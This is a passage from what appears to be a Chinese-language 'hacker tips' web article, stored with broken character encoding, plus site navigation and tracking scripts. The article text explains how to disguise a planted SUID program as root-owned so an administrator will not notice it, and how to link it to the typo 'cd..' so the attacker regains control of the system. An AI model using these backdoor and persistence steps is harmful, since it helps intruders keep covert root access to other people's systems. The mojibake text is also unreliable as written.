å‘½ä»¤å°†è¯¥ç¨‹åºçš„å±ä¸»æ”¹ä¸º rootï¼Œä½¿ç®¡ç†å‘˜ä½¿ç”¨ "ls -alF" å‘½ä»¤çœ‹åˆ° suid ç¨‹åºæ—¶ä¸è‡³äºæ€€ç–‘ã€‚<br>å¥½äº†ï¼Œå°†è¿™ä¸ªç¨‹åºï¼ˆå‡è®¾å…¶åä¸º fidï¼‰æ”¾å¥½ä»¥åï¼Œä¸‹ä¸€æ­¥çš„å·¥ä½œå°±æ˜¯å»ºç«‹è¯¥ç¨‹åºåˆ° "cd.." çš„é“¾æ¥ï¼šln cd.. /bin/outã€‚è¿™æ ·ï¼Œåªè¦ç³»ç»Ÿç®¡ç†å‘˜çŠ¯äº†è¿™ä¸ªè¾“å…¥é”™è¯¯ï¼Œä½ å°±å¯ä»¥åˆä¸€æ¬¡å¾—åˆ°ç³»ç»Ÿæ§åˆ¶æƒäº†ã€‚<br></p><p>ç‰ˆæƒæœ‰ä¾µçŠ¯è¯·å‘ŠçŸ¥ï¼Œéšæ—¶åˆ é™¤ã€‚</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'æŠ€å·§','åˆçº§','éª‡å®¢'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=æœç´¢>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>ğŸ”</button></form></section><section class=widget><h3 class=widget-title>æœ€æ–°æ–‡ç«  âš¡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>å…¶ä»–</h3><ul class=widget-list><li><a href=TOS.html>ä½¿ç”¨æ¢æ¬¾</a></li><li><a href=CommentPolicy.html>ç•™è¨€æ”¿ç­–</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>è¯çµ¡æˆ‘å€‘</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>æå®¢å¿«è¨Š</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>